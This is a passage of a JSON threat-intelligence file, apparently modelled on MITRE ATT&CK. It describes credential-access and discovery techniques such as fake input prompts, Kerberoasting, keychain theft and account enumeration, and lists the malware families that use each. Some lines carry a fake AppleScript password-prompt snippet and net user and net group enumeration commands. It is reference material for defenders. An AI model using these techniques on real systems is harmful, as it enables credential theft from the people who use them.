                    "Description": "OwaAuth captures and DES-encrypts credentials before writing the username and password to a log file, C:\\log.txt.[32]"
                },
                {
                    "Name": "PLATINUM",
                    "Description": "PLATINUM has used several different keyloggers.[33]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy contains a keylogger.[49][50]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's Get-Keystrokes Exfiltration module can log keystrokes.[51][52]"
                },
                {
                    "Name": "Prikormka",
                    "Description": "Prikormka contains a keylogger module that collects keystrokes and the titles of foreground windows.[53]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton uses a keylogger to capture keystrokes.[39]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy uses a keylogger to capture keystrokes it then sends back to the server after it is stopped.[54]"
                },
                {
                    "Name": "QuasarRAT",
                    "Description": "QuasarRAT has a built-in keylogger.[55][56]"
                },
                {
                    "Name": "Regin",
                    "Description": "Regin contains a keylogger.[57]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec contains a keylogger component.[58][59]"
                },
                {
                    "Name": "ROKRAT",
                    "Description": "ROKRAT uses a keylogger to capture keystrokes and location of where the user is typing.[60]"
                },
                {
                    "Name": "Rover",
                    "Description": "Rover has keylogging functionality.[61]"
                },
                {
                    "Name": "RTM",
                    "Description": "RTM can record keystrokes from both the keyboard and virtual keyboard.[62]"
                },
                {
                    "Name": "RunningRAT",
                    "Description": "RunningRAT captures keystrokes and sends them back to the C2 server.[63]"
                },
                {
                    "Name": "Sowbug",
                    "Description": "Sowbug has used keylogging tools.[64]"
                },
                {
                    "Name": "SslMM",
                    "Description": "SslMM creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators.[65]"
                },
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot contains keylogging functionality to steal passwords.[66]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 actors installed a credential logger on Microsoft Exchange servers. Threat Group-3390 also leveraged the reconnaissance framework, ScanBox, to capture keystrokes.[32][67][68]"
                },
                {
                    "Name": "TinyZBot",
                    "Description": "TinyZBot contains keylogger functionality.[69]"
                },
                {
                    "Name": "Unknown Logger",
                    "Description": "Unknown Logger is capable of recording keystrokes.[9]"
                },
                {
                    "Name": "VERMIN",
                    "Description": "VERMIN collects keystrokes from the victim machine.[70]"
                },
                {
                    "Name": "XAgentOSX",
                    "Description": "XAgentOSX contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure.[71]"
                },
                {
                    "Name": "yty",
                    "Description": "yty uses a keylogger plugin to gather keystrokes.[72]"
                }
            ]
        },
        "Input Prompt": {
            "Name": "Input Prompt",
            "Description": "When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task. Adversaries can mimic this functionality to prompt users for credentials with a normal-looking prompt. This type of prompt can be accomplished with AppleScript:set thePassword to the text returned of (display dialog \"AdobeUpdater needs permission to check for updates. Please authenticate.\" default answer \"\") [1]Adversaries can prompt a user for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. [2]\n",
            "ID": "T1141",
            "Tactic": "Credential Access",
            "Platform: ": "macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "User interface, Process monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Calisto",
                    "Description": "Calisto presents an input prompt asking for the user's login and password.[3]"
                },
                {
                    "Name": "Dok",
                    "Description": "Dok prompts the user for credentials.[4]"
                },
                {
                    "Name": "iKitten",
                    "Description": "iKitten prompts the user for their credentials.[4]"
                },
                {
                    "Name": "Keydnap",
                    "Description": "Keydnap prompts the users for credentials.[5]"
                },
                {
                    "Name": "Proton",
                    "Description": "Proton prompts users for their credentials.[4]"
                }
            ]
        },
        "Kerberoasting": {
            "Name": "Kerberoasting",
            "Description": "Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service [1]). [2] [3] [4] [5]Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). [6] [7] Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. [7] [6] [5]This same attack could be executed using service tickets captured from network traffic. [7]Cracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to Valid Accounts. [4]\n",
            "ID": "T1208",
            "Tactic": "Credential Access",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Windows event logs",
            "Contributors: ": "Praetorian",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's Invoke-Kerberoast module can request service tickets and return crackable ticket hashes.[8][5]"
                }
            ]
        },
        "Keychain": {
            "Name": "Keychain",
            "Description": "Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in ~/Library/Keychains/,/Library/Keychains/, and /Network/Library/Keychains/. [1] The security command-line utility, which is built into macOS by default, provides a useful way to manage these credentials.To manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault. [2] By default, the passphrase for the keychain is the user’s logon credentials.\n",
            "ID": "T1142",
            "Tactic": "Credential Access",
            "Platform: ": "macOS",
            "Permissions Required: ": "Administrator",
            "Data Sources: ": "System calls, Process monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Calisto",
                    "Description": "Calisto collects Keychain storage data and copies those passwords/tokens to a file.[3][4]"
                },
                {
                    "Name": "iKitten",
                    "Description": "iKitten collects the keychains on the system.[5]"
                }
            ]
        },
        "LLMNR/NBT-NS Poisoning": {
            "Name": "LLMNR/NBT-NS Poisoning",
            "Description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. [1] [2]Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.Several tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder. [3] [4] [5]\n",
            "ID": "T1171",
            "Tactic": "Credential Access",
            "Platform: ": "Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "Windows Registry, Packet capture, Netflow/Enclave netflow",
            "Contributors: ": "Matthew Demaske, Adaptforward",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Pupy",
                    "Description": "Pupy can sniff plaintext network credentials and use NBNS Spoofing to poison name services.[6]"
                },
                {
                    "Name": "Responder",
                    "Description": "Responder is used to poison name services to gather hashes and credentials from systems within a local network.[5]"
                }
            ]
        },
        "Network Sniffing": {
            "Name": "Network Sniffing",
            "Description": "Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as LLMNR/NBT-NS Poisoning, can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) necessary for follow-on Lateral Movement and/or Defense Evasion activities.\n",
            "ID": "T1040",
            "Tactic": "Credential Access, Discovery",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "Network device logs, Host network interface, Netflow/Enclave netflow, Process monitoring",
            "CAPEC ID: ": "CAPEC-158",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "APT28",
                    "Description": "APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.[1][2]"
                },
                {
                    "Name": "Regin",
                    "Description": "Regin appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB.[3]"
                },
                {
                    "Name": "Responder",
                    "Description": "Responder captures hashes and credentials that are sent to the system after the name services have been poisoned.[4]"
                }
            ]
        },
        "Password Filter DLL": {
            "Name": "Password Filter DLL",
            "Description": "Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. [1]\n",
            "ID": "T1174",
            "Tactic": "Credential Access",
            "Platform: ": "Windows",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "DLL monitoring, Process monitoring, Windows Registry",
            "Contributors: ": "Vincent Le Toux",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Remsec",
                    "Description": "Remsec harvests plain-text credentials as a password filter registered on domain controllers.[2]"
                }
            ]
        },
        "Private Keys": {
            "Name": "Private Keys",
            "Description": "Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. [1]Adversaries may gather private keys from compromised systems for use in authenticating to Remote Services like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as ~/.ssh for SSH keys on * nix-based systems or C:\\Users(username).ssh\\ on Windows.Private keys should require a password or passphrase for operation, so an adversary may also use Input Capture for keylogging or attempt to Brute Force the passphrase off-line.Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. [2] [3]\n",
            "ID": "T1145",
            "Tactic": "Credential Access",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "File monitoring",
            "Contributors: ": "Itzik Kotler, SafeBreach",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Mimikatz",
                    "Description": "Mimikatz's CRYPTO::Extract module can extract keys by interacting with Windows cryptographic application programming interface (API) functions.[4]"
                }
            ]
        },
        "Securityd Memory": {
            "Name": "Securityd Memory",
            "Description": "In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. [1] [2] Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password. [1]If an adversary can obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc. [1] [3]\n",
            "ID": "T1167",
            "Tactic": "Credential Access",
            "Platform: ": "macOS",
            "Permissions Required: ": "root",
            "Data Sources: ": "Process monitoring",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Keydnap",
                    "Description": "Keydnap uses the keychaindump project to read securityd memory.[4]"
                }
            ]
        },
        "Two-Factor Authentication Interception": {
            "Name": "Two-Factor Authentication Interception",
            "Description": "Use of two- or multifactor authentication is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. Adversaries may target authentication mechanisms, such as smart cards, to gain access to systems, services, and network resources.If a smart card is used for two-factor authentication (2FA), then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. [1]Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). [2]Other methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. [3]\n",
            "ID": "T1111",
            "Tactic": "Credential Access",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "Administrator, SYSTEM",
            "Data Sources: ": "API monitoring, Process monitoring, Kernel drivers",
            "Contributors: ": "John Lambert, Microsoft Threat Intelligence Center",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot is known to contain functionality that enables targeting of smart card technologies to proxy authentication for connections to restricted network resources using detected hardware tokens.[4]"
                }
            ]
        },
        "Account Discovery": {
            "Name": "Account Discovery",
            "Description": "Adversaries may attempt to get a listing of local system or domain accounts. WindowsExample commands that can acquire this information are net user, net group , and net localgroup  using the Net utility or through use of dsquery. If adversaries attempt to identify the primary user, currently logged in user, or set of users that commonly uses a system, System Owner/User Discovery may apply.MacOn Mac, groups can be enumerated through the groups and id commands. In mac specifically, dscl . list /Groups and dscacheutil -q group can also be used to enumerate groups and users.LinuxOn Linux, local users can be enumerated through the use of the /etc/passwd file which is world readable. In mac, this same file is only used in single-user mode in addition to the /etc/master.passwd file.Also, groups can be enumerated through the groups and id commands.\n",
            "ID": "T1087",
            "Tactic": "Discovery",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "API monitoring, Process monitoring, Process command-line parameters",
            "CAPEC ID: ": "CAPEC-575",
            "Contributors: ": "Travis Smith, Tripwire",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "admin@338",
                    "Description": "admin@338 actors used the following commands following exploitation of a machine with LOWBALL malware to enumerate user accounts: net user >> %temp%\\download net user /domain >> %temp%\\download[1]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has used a tool that can obtain info about local and global group users, power users, and administrators.[2]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot gathers domain and account names/information through process monitoring.[3]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has used net user /domain to identify account information.[4]"
                },
                {
                    "Name": "Comnie",
                    "Description": "Comnie uses the net user command.[5]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used batch scripts to enumerate users in the victim environment.[6]"
                },
                {
                    "Name": "dsquery",
                    "Description": "dsquery can be used to gather information on user accounts within a domain.[7]"
                },
                {
                    "Name": "Duqu",
                    "Description": "The discovery modules used with Duqu can collect information on accounts and permissions.[8]"
                },
                {
                    "Name": "Elise",
                    "Description": "Elise executes net user after initial communication is made to the remote server.[9]"
                },
                {
                    "Name": "FIN6",
                    "Description": "FIN6 has used Metasploit’s PsExec NTDSGRAB module to obtain a copy of the victim's Active Directory database.[10]"
                },
                {
                    "Name": "GeminiDuke",
                    "Description": "GeminiDuke collects information on local user accounts from the victim.[11]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole has a command to list account information on the victim’s machine.[12]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar gathers information on local groups and members on the victim’s machine.[13]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang performs account discovery using commands such as net localgroup administrators and net group \"REDACTED\" /domain on specific permissions groups.[14]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects a list of accounts with the command net users.[15]"
                },
                {
                    "Name": "menuPass",
                    "Description": "menuPass has used the Microsoft administration tool csvde.exe to export Active Directory data.[16]"
                },
                {
                    "Name": "Mis-Type",
                    "Description": "Mis-Type may create a file containing the results of the command cmd.exe /c net user {Username}.[17]"
                },
                {
                    "Name": "MURKYTOP",
                    "Description": "has the capability to retrieve information about users on remote hosts.[18]"
                },
                {
                    "Name": "Net",
                    "Description": "Commands under net user can be used in Net to gather information about and manipulate user accounts.[19]"
                },
                {
                    "Name": "OilRig",
                    "Description": "OilRig has run net user, net user /domain, net group \"domain admins\" /domain, and net group \"Exchange Trusted Subsystem\" /domain to get account listings on a victim.[20]"
                },
                {
                    "Name": "OSInfo",
                    "Description": "OSInfo enumerates local and domain users[2]"
                },
                {
                    "Name": "Poseidon Group",
                    "Description": "Poseidon Group searches for administrator accounts on both the local victim machine and the network.[21]"
                },
                {
                    "Name": "PowerSploit",
                    "Description": "PowerSploit's Get-ProcessTokenGroup Privesc-PowerUp module can enumerate all SIDs associated with its current token.[22][23]"
                },
                {
                    "Name": "POWERSTATS",
                    "Description": "POWERSTATS can retrieve usernames from compromised hosts.[24]"
                },
                {
                    "Name": "POWRUNER",
                    "Description": "POWRUNER may collect user account information by running net user /domain or a series of other commands on a victim.[25]"
                },
                {
                    "Name": "Pupy",
                    "Description": "Pupy uses PowerView and Pywerview to perform discovery commands such as net user, net group, net local group, etc.[26]"
                },
                {
                    "Name": "RATANKBA",
                    "Description": "RATANKBA uses the net user command.[27]"
                },
                {
                    "Name": "Remsec",
                    "Description": "Remsec can obtain a list of users.[28]"
                },
                {
                    "Name": "S-Type",
                    "Description": "S-Type runs the command net user on a victim. S-Type also runs tests to determine the privilege level of the compromised user.[17]"
                },
                {
                    "Name": "SHOTPUT",
                    "Description": "SHOTPUT has a command to retrieve information about connected users.[29]"
                },
                {
                    "Name": "Sykipot",
                    "Description": "Sykipot may use net group \"domain admins\" /domain to display accounts in the \"domain admins\" permissions group and net localgroup \"administrators\" to list local system administrator group membership.[30]"
                },
                {
                    "Name": "Threat Group-3390",
                    "Description": "Threat Group-3390 has used net user to conduct internal discovery of systems.[31]"
                },
                {
                    "Name": "TrickBot",
                    "Description": "TrickBot collects the users of the system.[32]"
                }
            ]
        },
        "Application Window Discovery": {
            "Name": "Application Window Discovery",
            "Description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.In Mac, this can be done natively with a small AppleScript script.\n",
            "ID": "T1010",
            "Tactic": "Discovery",
            "Platform: ": "macOS, Windows",
            "Permissions Required: ": "User",
            "Data Sources: ": "API monitoring, Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Catchamas",
                    "Description": "Catchamas obtains application windows titles and then determines which windows to perform Screen Capture on.[1]"
                },
                {
                    "Name": "Duqu",
                    "Description": "The discovery modules used with Duqu can collect information on open windows.[2]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar gathers information about opened windows.[3]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Lazarus Group malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.[4][5][6]"
                },
                {
                    "Name": "NetTraveler",
                    "Description": "NetTraveler reports window names along with keylogger information to provide application context.[7]"
                },
                {
                    "Name": "PoisonIvy",
                    "Description": "PoisonIvy captures window titles.[8]"
                },
                {
                    "Name": "PowerDuke",
                    "Description": "PowerDuke has a command to get text of the current foreground window.[9]"
                },
                {
                    "Name": "SOUNDBITE",
                    "Description": "SOUNDBITE is capable of enumerating application windows.[10]"
                },
                {
                    "Name": "WINERACK",
                    "Description": "WINERACK can enumerate active windows.[11]"
                }
            ]
        },
        "Browser Bookmark Discovery": {
            "Name": "Browser Bookmark Discovery",
            "Description": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.Browser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially Credentials in Files associated with logins cached by a browser.Specific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.\n",
            "ID": "T1217",
            "Tactic": "Discovery",
            "Platform: ": "Linux, Windows, macOS",
            "Permissions Required: ": "User",
            "Data Sources: ": "API monitoring, File monitoring, Process command-line parameters, Process monitoring",
            "Contributors: ": "Mike Kemmerer",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "Calisto",
                    "Description": "Calisto collects information on bookmarks from Google Chrome.[1]"
                },
                {
                    "Name": "MobileOrder",
                    "Description": "MobileOrder has a command to upload to its C2 server victim browser bookmarks.[2]"
                }
            ]
        },
        "File and Directory Discovery": {
            "Name": "File and Directory Discovery",
            "Description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. WindowsExample utilities used to obtain this information are dir and tree. [1] Custom tools may also be used to gather file and directory information and interact with the Windows API.Mac and LinuxIn Mac and Linux, this kind of discovery is accomplished with the ls, find, and locate commands.\n",
            "ID": "T1083",
            "Tactic": "Discovery",
            "Platform: ": "Linux, macOS, Windows",
            "Permissions Required: ": "User, Administrator, SYSTEM",
            "Data Sources: ": "File monitoring, Process monitoring, Process command-line parameters",
            "Version": "1.0",
            "Examples": [
                {
                    "Name": "3PARA RAT",
                    "Description": "3PARA RAT has a command to retrieve metadata for files on disk as well as a command to list the current working directory.[2]"
                },
                {
                    "Name": "4H RAT",
                    "Description": "4H RAT has the capability to obtain file and directory listings.[2]"
                },
                {
                    "Name": "admin@338",
                    "Description": "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directories: dir c:\\ >> %temp%\\download dir \"c:\\Documents and Settings\" >> %temp%\\download dir \"c:\\Program Files\\\" >> %temp%\\download dir d:\\ >> %temp%\\download[3]"
                },
                {
                    "Name": "ADVSTORESHELL",
                    "Description": "ADVSTORESHELL can list files and directories.[4][5]"
                },
                {
                    "Name": "APT28",
                    "Description": "APT28 has used Forfiles to locate PDF, Excel, and Word documents during. The group also searched a compromised DCCC computer for specific terms.[6][7]"
                },
                {
                    "Name": "APT3",
                    "Description": "APT3 has a tool that looks for files and directories on the local file system.[8][9]"
                },
                {
                    "Name": "AutoIt backdoor",
                    "Description": "AutoIt backdoor is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.[10]"
                },
                {
                    "Name": "Backdoor.Oldrea",
                    "Description": "Backdoor.Oldrea collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.[11]"
                },
                {
                    "Name": "BACKSPACE",
                    "Description": "BACKSPACE allows adversaries to search for files.[12]"
                },
                {
                    "Name": "BADNEWS",
                    "Description": "BADNEWS identifies files with certain extensions from USB devices, then copies them to a predefined directory.[13]"
                },
                {
                    "Name": "Bankshot",
                    "Description": "Bankshot searches for files on the victim's machine.[14]"
                },
                {
                    "Name": "BBSRAT",
                    "Description": "BBSRAT can list file and directory information.[15]"
                },
                {
                    "Name": "BLACKCOFFEE",
                    "Description": "BLACKCOFFEE has the capability to enumerate files.[16]"
                },
                {
                    "Name": "BlackEnergy",
                    "Description": "BlackEnergy gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry. BlackEnergy has searched for given file types.[17][18]"
                },
                {
                    "Name": "Brave Prince",
                    "Description": "Brave Prince gathers file and directory information from the victim’s machine.[19]"
                },
                {
                    "Name": "BRONZE BUTLER",
                    "Description": "BRONZE BUTLER has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.[20]"
                },
                {
                    "Name": "ChChes",
                    "Description": "ChChes collects the victim's %TEMP% directory path and version of Internet Explorer.[21]"
                },
                {
                    "Name": "China Chopper",
                    "Description": "China Chopper can list directory contents.[22]"
                },
                {
                    "Name": "CHOPSTICK",
                    "Description": "An older version of CHOPSTICK has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.[4]"
                },
                {
                    "Name": "cmd",
                    "Description": "cmd can be used to find files and directories with native functionality such as dir commands.[23]"
                },
                {
                    "Name": "CORALDECK",
                    "Description": "CORALDECK searches for specified files.[24]"
                },
                {
                    "Name": "CosmicDuke",
                    "Description": "CosmicDuke searches attached and mounted drives for file extensions and keywords that match a predefined list.[25]"
                },
                {
                    "Name": "Crimson",
                    "Description": "Crimson contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.[26]"
                },
                {
                    "Name": "CrossRAT",
                    "Description": "CrossRAT can list all files on a system."
                },
                {
                    "Name": "Dark Caracal",
                    "Description": "Dark Caracal collected file listings of all default Windows directories.[27]"
                },
                {
                    "Name": "DDKONG",
                    "Description": "DDKONG lists files on the victim’s machine.[28]"
                },
                {
                    "Name": "Derusbi",
                    "Description": "Derusbi is capable of obtaining directory, file, and drive listings.[29][22]"
                },
                {
                    "Name": "Dragonfly 2.0",
                    "Description": "Dragonfly 2.0 used a batch script to gather folder and file names from victim hosts.[30]"
                },
                {
                    "Name": "Dust Storm",
                    "Description": "Dust Storm has used Android backdoors capable of enumerating specific files on the infected devices.[31]"
                },
                {
                    "Name": "DustySky",
                    "Description": "DustySky scans the victim for files that contain certain keywords from a list that is obtained from the C2 as a text file. It also collects information about installed software.[32]"
                },
                {
                    "Name": "Elise",
                    "Description": "A variant of Elise executes dir C:\\progra~1 when initially run.[33]"
                },
                {
                    "Name": "ELMER",
                    "Description": "ELMER is capable of performing directory listings.[34]"
                },
                {
                    "Name": "FALLCHILL",
                    "Description": "FALLCHILL can search files on a victim.[35]"
                },
                {
                    "Name": "FinFisher",
                    "Description": "FinFisher enumerates directories and scans for certain files.[36][37]"
                },
                {
                    "Name": "FLASHFLOOD",
                    "Description": "FLASHFLOOD searches for interesting files (either a default or customized set of file extensions) on the local system and removable media.[12]"
                },
                {
                    "Name": "Forfiles",
                    "Description": "Forfiles can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)[6]"
                },
                {
                    "Name": "FruitFly",
                    "Description": "FruitFly looks for specific files and file types.[38]"
                },
                {
                    "Name": "GeminiDuke",
                    "Description": "GeminiDuke collects information from the victim, including installed drivers, programs previously executed by users, programs and services configured to automatically run at startup, files and folders present in any user's home folder, files and folders present in any user's My Documents, programs installed to the Program Files folder, and recently accessed files, folders, and programs.[39]"
                },
                {
                    "Name": "Gold Dragon",
                    "Description": "Gold Dragon lists the directories for Desktop, program files, and the user’s recently accessed files.[19]"
                },
                {
                    "Name": "GravityRAT",
                    "Description": "GravityRAT collects the volumes mapped on the system, and also steals files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf, and .pdf.[40]"
                },
                {
                    "Name": "Honeybee",
                    "Description": "Honeybee's service-based DLL implant traverses the FTP server’s directories looking for files with keyword matches for computer names or certain keywords.[41]"
                },
                {
                    "Name": "HTTPBrowser",
                    "Description": "HTTPBrowser is capable of listing files, folders, and drives on a victim.[42][43]"
                },
                {
                    "Name": "Hydraq",
                    "Description": "Hydraq creates a backdoor through which remote attackers can check for the existence of files, including its own components, as well as retrieve a list of logical drives.[44][45]"
                },
                {
                    "Name": "InnaputRAT",
                    "Description": "InnaputRAT enumerates directories and obtains file attributes on a system.[46]"
                },
                {
                    "Name": "InvisiMole",
                    "Description": "InvisiMole can lists information about files in a directory.[47]"
                },
                {
                    "Name": "JPIN",
                    "Description": "JPIN can enumerate drives and their types. It can also change file permissions using cacls.exe.[48]"
                },
                {
                    "Name": "Kasidet",
                    "Description": "Kasidet has the ability to search for a given filename on a victim.[49]"
                },
                {
                    "Name": "Kazuar",
                    "Description": "Kazuar finds a specified directory, lists the files and metadata about those files.[50]"
                },
                {
                    "Name": "Ke3chang",
                    "Description": "Ke3chang uses command-line interaction to search files and directories.[51]"
                },
                {
                    "Name": "KEYMARBLE",
                    "Description": "KEYMARBLE has a command to search for files on the victim’s machine.[52]"
                },
                {
                    "Name": "Kwampirs",
                    "Description": "Kwampirs collects a list of files and directories in C:\\ with the command dir /s /a c:\\ >> \"C:\\windows\\TEMP[RANDOM].tmp\".[53]"
                },
                {
                    "Name": "Lazarus Group",
                    "Description": "Several Lazarus Group malware samples use a common function to identify target files by their extension. Lazarus Group malware families can also enumerate files and directories, including a Destover-like variant that lists files and gathers information for all drives.[54][55]"
                },
                {
                    "Name": "Leafminer",
                    "Description": "Leafminer used a tool called MailSniper to search for files on the desktop and another utility called Sobolsoft to extract attachments from EML files.[56]"
                },
                {
                    "Name": "Linfo",
                    "Description": "Linfo creates a backdoor through which remote attackers can list contents of drives and search for files.[57]"
                },
                {
                    "Name": "Magic Hound",
                    "Description": "Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.[58]"
                },
                {
                    "Name": "Misdat",
                    "Description": "Misdat is capable of running commands to obtain a list of files and directories, as well as enumerating logical drives.[31]"
                },
                {
                    "Name": "MobileOrder",
                    "Description": "MobileOrder has a command to upload to its C2 server information about files on the victim mobile device, including SD card size, installed app list, SMS content, contacts, and calling history.[59]"
                },
                {
                    "Name": "MoonWind",
                    "Description": "MoonWind has a command to return a directory listing for a specified directory.[60]"
                },
                {
                    "Name": "NDiskMonitor",
                    "Description": "NDiskMonitor can obtain a list of all files and directories as well as logical drives.[13]"
                },
                {
                    "Name": "NETEAGLE",
                    "Description": "NETEAGLE allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.[12]"
                },
                {
                    "Name": "Orz",
